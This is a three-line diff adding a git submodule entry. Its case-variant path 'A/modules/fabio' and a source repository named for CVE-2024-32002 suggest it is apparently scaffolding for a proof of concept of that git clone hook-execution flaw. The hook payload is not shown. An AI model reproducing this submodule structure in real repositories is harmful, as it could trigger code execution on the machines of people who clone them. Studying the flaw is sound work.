@@ -1,0 +1,3 @@
+[submodule "fabio/kon"]
+    path = A/modules/fabio
+    url = git@github.com:O-Carneiro/cve_2024_32002_hook.git
